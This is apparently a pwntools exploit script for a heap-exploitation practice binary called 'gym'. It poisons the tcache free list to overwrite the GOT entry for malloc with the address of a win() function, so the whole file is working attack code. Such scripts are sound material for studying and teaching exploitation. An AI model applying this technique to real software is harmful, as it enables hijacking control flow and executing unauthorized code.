#!/usr/bin/python3
# ./attack.py GDB or ./attack.py
from pwn import process, gdb, args, p64, ELF

binary = './gym'

gs = """
break main
continue
"""

e = ELF(binary)

END_OF_MENU = "e.g, l\n"


def malloc(p, size):
    p.sendline(b"m %d" % size)
    p.recvuntil(END_OF_MENU)


def free(p, index):
    p.sendline(b"f %d" % index)
    p.recvuntil(END_OF_MENU)


def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    p.recvuntil(END_OF_MENU)


def exit(p):
    p.sendline(b"0")


def launch_attack(p):
    # 1. malloc, free, so that there's chunk in tache
    malloc(p, 8)  # the 0th pointer
    free(p, 0)
    # 2. edit the freed chunk in tachebin
    pointer = p64(e.got["malloc"])
    edit(p, 0, pointer)
    # 3. malloc
    malloc(p, 8) # the 1st pointer
    # 4. malloc -> victim pointer (got["malloc"])
    malloc(p, 8) # the 2nd pointer, which is also the victim pointer
    # 5. [pointer] -> address of win()
    edit(p, 2, p64(e.symbols.win))
    # 6. malloc
    p.interactive()


def main():
    if args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p = process(binary)

    p.recvuntil(END_OF_MENU)
    launch_attack(p)

    # Make sure that this is kept for gdb
    # p.interactive()


if __name__ == "__main__":
    main()
